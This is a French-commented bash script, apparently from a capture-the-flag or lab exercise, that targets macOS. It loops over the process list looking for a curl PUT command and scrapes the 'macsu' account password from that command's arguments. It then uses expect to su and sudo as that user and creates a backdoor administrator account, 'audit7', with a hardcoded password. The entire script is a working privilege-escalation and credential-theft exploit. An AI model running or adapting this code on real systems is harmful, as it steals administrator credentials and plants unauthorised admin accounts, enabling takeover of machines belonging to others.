#!/bin/bash

# Nom du compte à créer
NEW_USER="audit7"
NEW_PASS="0YouFl4gTh"

# Fonction pour exécuter une commande en tant que macsu avec su
run_as_macsu() {
    /usr/bin/expect <<EOF
spawn su - macsu
expect "Password:"
send "$PASSWORD\r"
expect "$ "
send "sudo su\r"
expect "Password:"
send "$PASSWORD\r"
expect "# "
send "$1\r"
expect eof
EOF
}

create_sudo_user() {
    echo "[INFO] Création de l'utilisateur sudo : $NEW_USER"

    run_as_macsu "sysadminctl -addUser $NEW_USER -fullName $NEW_USER -password $NEW_PASS -admin -shell /bin/bash"

    echo "[SUCCESS] L'utilisateur $NEW_USER a été créé avec les privilèges sudo."
}

# Surveillance des processus
echo "[INFO] Surveillance des processus en cours..."
while true; do
    # Récupérer le processus curl suspect
    process=$(ps aux | grep "curl" | grep "PUT")

    if [[ ! -z "$process" ]]; then
        echo "[ALERT] Processus détecté : $process"

        # Extraction du mot de passe entre <macsu_attribut> </macsu_attribut>
        PASSWORD=$(echo "$process" | sed -n 's/.*<value>\(.*\)<\/value>.*/\1/p')

        if [[ ! -z "$PASSWORD" ]]; then
            echo "[INFO] Mot de passe extrait avec succès."

            # Vérifier si l'utilisateur existe déjà
            id -u $NEW_USER &>/dev/null
            if [[ $? -eq 0 ]]; then
                echo "[INFO] L'utilisateur $NEW_USER existe déjà."
            else
                # Créer un utilisateur sudo
                create_sudo_user
            fi
            break
        fi
    fi
    sleep 0.5  # Vérifier toutes les secondes
done

